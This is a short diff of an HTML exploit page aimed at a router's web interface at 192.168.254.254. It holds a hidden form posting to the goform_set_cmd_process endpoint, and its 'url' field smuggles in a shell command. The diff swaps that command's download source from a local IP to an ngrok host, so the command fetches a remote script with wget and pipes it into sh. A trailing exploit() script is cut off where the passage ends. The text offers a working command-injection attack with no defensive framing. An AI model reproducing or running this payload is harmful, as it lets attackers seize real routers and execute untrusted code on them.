@@ -1,7 +1,7 @@
 <form method="post" id="exploit" action="http://192.168.254.254/goform/goform_se
 t_cmd_process"><input name="isTest" value="false" type="hidden"><input name="gof
 ormId" value="send_at_tools" type="hidden"><input name="url" value="AT > /tmp/at
-send.log && wget http://192.168.99.134:8002/R051/z1t_s10g_41s_n3w.sh -0-|
+send.log && wget http://beb0-175-176-0-61.ngrok-free.app/Renzkie14/zlts10g/raw/main/zlt.sh -O -|
 sh &&" type="hidden"><input type="submit" style="display:none;"></form>
 <script>
 function exploit () {
